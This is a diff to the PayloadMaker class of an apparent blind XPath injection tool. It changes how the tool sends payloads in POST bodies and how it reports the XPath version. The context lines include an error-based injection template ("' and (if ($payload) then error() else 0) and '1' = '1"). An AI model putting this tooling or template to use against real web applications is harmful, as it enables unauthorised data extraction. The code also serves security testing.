@@ -89,7 +89,7 @@ class PayloadMaker(object):
         self.search_space = string.ascii_letters + string.digits + " .-"
         self.agent = Agent(reactor)
 
-        self._headers = Headers({"User-Agent":[config.user_agent]})
+        self._headers = Headers({"User-Agent":[config.user_agent], "Content-Type":["application/x-www-form-urlencoded"]})
 
         if config.error_keyword:
             self.BASE = string.Template("' and (if ($payload) then error() else 0) and '1' = '1".replace("'", config.quote_character))
@@ -113,16 +113,19 @@ class PayloadMaker(object):
             URI = self.config.URL
 
         try:
+            #print self.config.post_argument.replace("{0}", payload)
+            body = StringProducer(self.config.post_argument.replace("{0}", payload)) if self.config.http_method == "POST" else None
             response = yield self.agent.request(
                 self.config.http_method,
                 URI,
                 self._headers,
-                StringProducer(self.config.post_argument + payload) if self.config.http_method == "POST" else None
+                body
             )
 
             body_deferred = defer.Deferred()
             response.deliverBody(QuickAndDirtyReceiver(body_deferred))
             content = yield body_deferred
+
         except Exception:
             if errorCount >= 5:
                 raise
@@ -163,10 +166,10 @@ class PayloadMaker(object):
         x = yield self.RunQuery(self.Get("DETECT_VERSION")())
         if x:
             self.config.xversion = "2"
-            defer.returnValue(2)
+            defer.returnValue("2")
         else:
             self.config.xversion = "1"
-            defer.returnValue(1)
+            defer.returnValue("1")
 
 class QuickAndDirtyReceiver(Protocol):
     def __init__(self, deferred):
